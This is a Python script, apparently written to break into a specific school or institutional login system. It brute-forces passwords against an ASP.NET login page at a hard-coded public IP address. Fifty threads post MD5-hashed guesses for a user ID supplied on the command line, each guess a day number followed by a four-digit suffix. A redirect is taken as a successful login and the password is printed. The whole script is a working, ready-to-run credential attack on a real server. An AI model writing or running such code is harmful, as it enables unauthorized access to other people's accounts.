cookies = {
        'ASP.NET_SessionId': 'mj2pw3vivqiaej4jrsv0w1ql'
        }
header = {
        'Date':'Tue, 05 Jul 2016 06:17:26 GMT',
        'Server':'Microsoft-IIS/6.0',
        'X-Powered-By': 'ASP.NET',
        'X-AspNet-Version': '4.0.30319',
        'Location': '/default.aspx',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Expires': '-1',
        'Content-Type': 'text/html; charset=utf-8',
        'Content-Length':  '130',
        'Accept-encoding':'gzip'
        }

import requests, re, hashlib, threading, queue
import sys

processnum = 50
if len(sys.argv) > 3:
    print ("Too many argument")
if len(sys.argv) >= 2:
    print (sys.argv[1])
if len(sys.argv) >= 3:
    processnum = int(sys.argv[2])
class aolang(threading.Thread):

    def __init__(self, cqueue):
        threading.Thread.__init__(self)
        self.cqueue = cqueue
        self.stop_flag= False

    def run(self):
        data = {
        '__VIEWSTATE': 'go6WJBsZ1m4enxs9VlUqZsA0+FTdNM2Yz9OydXYB6rSwW+fW9jeNXI++1nqQxQanNDy75AkmU8tccZCEJOrAdL34sqobmhKbrvvkIHCCytc5JGkOi80L+eSlLUs=',
        '__VIEWSTATEGENERATOR': 'C2EE9ABB',
        'userbh': 'B14070302',
        'pass': '78E636941E3FC7385F49DBB3B4FAA6CC', 
        'cw': '', 
        'xzbz': '1' 
        }
        if len(sys.argv) >= 2:
            data['userbh'] = sys.argv[1]
        while not self.cqueue.empty():
            if self.stop_flag:
                return
            string = self.cqueue.get()
            ss = requests.session()
            codemd5 = hashlib.md5(string.upper().encode()).hexdigest().upper()
            data['pass'] = codemd5
            for i in range(1, 100):
                try:
                    r2 = ss.post('http://180.209.64.253:866/login.aspx', data = data)
                    #r3 = ss.get('http://180.209.64.253:866/default.aspx')
                except:
                    continue
                break

            print (data['pass'])
            print (string)
            if len(r2.history) != 0:
                for thread in threading.enumerate():
                    thread.stop_flag = True
                print ('欢迎你' + string)
                return
                '''
                #cookies = {'ASP.NET_SessionId' :ss.cookies['ASP.NET_SessionId']}
                viewstate = re.findall('name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)" />', str(r2.content))[0]
                generator = re.findall('name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="(.*?)" />', str(r2.content))[0]
                data['__VIEWSTATE'] = viewstate
                data['__VIEWSTATEGENERATOR'] = generator
                r3 = ss.post('http://180.209.64.253:866/login.aspx', data = data)
                r4 = ss.get('http://180.209.64.253:866/default.aspx')
                print (r4.content.decode('utf8'))
                '''
codequeue = queue.Queue()

for j in range(1, 9999):
    substring2 = str(j-1)
    substring2 = (4 - len(substring2))*'0' + substring2
    for i in range(1, 32):
        substring1 = str(i)
        if len(substring1) < 2:
            substring1 = '0' + substring1 
        string = substring1+substring2
        codequeue.put(string)
for i in range(1, processnum+1):
    aspider = aolang(codequeue)
    aspider.start()
